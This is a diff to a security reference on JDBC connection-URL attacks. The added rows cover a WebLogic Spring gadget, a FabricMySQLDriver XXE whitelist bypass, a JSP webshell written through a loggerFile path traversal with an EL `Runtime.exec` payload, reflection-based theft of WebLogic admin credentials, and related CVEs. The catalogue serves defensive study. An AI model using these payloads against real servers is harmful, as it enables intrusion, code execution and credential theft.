@@ -78,6 +78,7 @@ The driver supports pluggable socket and SSL factory classes specified via URL p
 | Subtype | Property | Constructor Arg Property | Exploitable With |
 |---|---|---|---|
 | **socketFactory** | `socketFactory={class}` | `socketFactoryArg={arg}` | Spring `ClassPathXmlApplicationContext` (RCE); `java.io.FileOutputStream` (arbitrary file write via path in `socketFactoryArg`) |
+| **socketFactory (WebLogic built-in)** | `socketFactory=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` | `socketFactoryArg={xml_url}` | WebLogic repackages Spring internally — this gadget is available by default without explicit Spring dependency. Loads malicious XML with `ProcessBuilder` beans for RCE |
 | **sslfactory** | `sslfactory={class}` | `sslfactoryarg={arg}` | Any single-string-arg constructor class |
 | **sslhostnameverifier** | `sslhostnameverifier={class}` | N/A | Classes with no-arg or single-arg constructors |
 
@@ -366,7 +367,16 @@ When applications construct JDBC URLs from user input, attackers can inject addi
 | **Property Override** | Later duplicate parameter overrides earlier | `?autoDeserialize=false&autoDeserialize=true` |
 | **URL Fragment/Userinfo** | Inject via `@` (userinfo) or `#` (fragment) in URL | `jdbc:mysql://user:pass@evil-host/db` |
 | **IPv6 Bracket Abuse** | Use `[::1]` or IPv6 brackets to bypass host validation | `jdbc:postgresql://[::1]/db` |
-| **Alternative Driver Exploitation** | When target driver properties are blacklisted, switch to an alternative JDBC driver with unfiltered attack surface. `com.mysql.fabric.jdbc.FabricMySQLDriver` contains XML parsing with XXE vulnerabilities, bypassing MySQL Connector/J blacklists. WebLogic's `ApplicationName` property accepts EL expressions, enabling JSP webshell write and credential extraction via reflection | Alternative driver on classpath; WebLogic application server |
+| **Alternative Driver (FabricMySQLDriver XXE)** | When MySQL Connector/J properties are blacklisted, use `com.mysql.fabric.jdbc.FabricMySQLDriver` (loaded via SPI). The `mysqlx:fabric://` URL scheme triggers XMLRPC HTTP calls to the attacker-controlled host; the XMLRPC client parses responses via `SAXParserFactory.newInstance()` without security attributes, enabling XXE for file read and SSRF. Bypasses CVE-2021-26919 (Apache Druid property whitelist) because the alternative driver sidesteps the whitelist entirely | MySQL Connector/J 5.1.x with Fabric extension on classpath; application enforces property whitelist on standard driver |
+
+### §10-3. WebLogic-Specific Exploitation Chains
+
+WebLogic application server exposes unique JDBC exploitation chains through its built-in properties, EL evaluation behavior, and internal management APIs. These chains leverage the PostgreSQL JDBC `loggerFile` write (§2-3) combined with WebLogic-specific features.
+
+| Subtype | Mechanism | Key Condition |
+|---|---|---|
+| **JSP Webshell via EL + loggerFile** | `loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp` writes JDBC log to console webapp directory. `ApplicationName=${Runtime.getRuntime().exec("cmd")}` embeds an EL expression in the log output. When the JSP is requested, WebLogic 14+ (Servlet 4.0) evaluates the EL expression, achieving RCE | WebLogic 14+ (Servlet 4.0 EL evaluation); writable console webapp path; old pgjdbc with loggerFile support |
+| **Credential Theft via Reflection** | After deploying a JSP webshell via loggerFile, the `pageContext` implicit object is used to traverse WebLogic's internal service graph via reflection: `ManagementService` → `PropertyService` → `getTimestamp1()` (admin username) / `getTimestamp2()` (admin password). Extracts WebLogic console credentials without file access | WebLogic admin console deployed; JSP execution context with `pageContext` available |
 
 ---
 
@@ -380,11 +390,12 @@ When applications construct JDBC URLs from user input, attackers can inject addi
 | **SQL Injection** | Driver parsing flaw, non-default configuration | §8 |
 | **Credential Theft / NTLM Relay** | Windows environment with MSSQL | §9-1 (MSSQL `xp_dirtree`/`xp_fileexist`) |
 | **Denial of Service** | Connection to malicious server causing resource exhaustion | §1 (infinite deserialization), §6 (Derby hang) |
-| **Webshell Deployment** | Write access to web-accessible directory | §2-3 (loggerFile), §5-1 (traceFile) |
+| **Webshell Deployment** | Write access to web-accessible directory | §2-3 (loggerFile), §5-1 (traceFile), §10-3 (WebLogic EL webshell) |
+| **CSRF → JDBC RCE** | WebLogic admin console with CSRF-exploitable data source test endpoint | §1 (MySQL deserialization) + §10 (parameter injection) |
 
 ---
 
-## CVE / Bounty Mapping (2022–2025)
+## CVE / Bounty Mapping (2020–2025)
 
 | Mutation Combination | CVE / Case | Impact |
 |---|---|---|
@@ -403,6 +414,9 @@ When applications construct JDBC URLs from user input, attackers can inject addi
 | §1 + §10 (MySQL Deser + Param Inject) | GHSA-q4qq (DataEase) | RCE via unverified MySQL JDBC connection params |
 | §3-1 (H2 INIT bypass) | GHSA-999m (DataEase) | RCE via H2 JDBC INIT/RUNSCRIPT bypass |
 | §1 + §4 (MySQL Deser + File Read) | CVE-2025-6507 (H2O-3) | RCE via JDBC deserialization with parameter space bypass |
+| §1 + §10 (MySQL Deser + WebLogic CSRF) | CVE-2020-2869 (WebLogic) / CVE-2020-2934 (MySQL Connector/J) | RCE via CSRF-triggered data source test connection to rogue MySQL server |
+| §10-2 (FabricMySQLDriver XXE) | CVE-2021-26919 bypass (Apache Druid) | XXE/file read via FabricMySQLDriver bypassing Druid property whitelist |
+| §1 + §10 (MySQL Deser + DolphinScheduler) | CVE-2020-11974 (Apache DolphinScheduler) | RCE via JDBC parameter injection in task scheduler |
 
 ---
 
@@ -447,7 +461,8 @@ The structural defense requires **treating JDBC URLs as security-critical inputs
 - [su18 — JDBC Connection URL Attack](https://su18.org/post/jdbc-connection-url-attack/)
 - [su18 — JDBC-Attack GitHub Repository](https://github.com/su18/JDBC-Attack)
 - [JFrog — The JNDI Strikes Back: RCE in H2 Database Console](https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/)
-- [pyn3rd — Make JDBC Attacks Great Again](https://blog.pyn3rd.com/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/)
+- [pyn3rd — Make JDBC Attacks Brilliant Again (Part 0)](https://blog.pyn3rd.com/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/)
+- [pyn3rd — Make JDBC Attacks Brilliant Again (Part I)](https://blog.pyn3rd.com/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/)
 - [fnmsd — MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)
 - [CVE-2024-1597 — PostgreSQL JDBC Driver SQL Injection](https://www.postgresql.org/about/news/postgresql-jdbc-4272-4261-4255-4244-4239-42228-and-42228jre7-security-update-for-cve-2024-1597-2812/)
 - [CVE-2022-21724 — pgjdbc Unchecked Class Instantiation](https://github.com/advisories/GHSA-v7wg-cpwc-24m4)
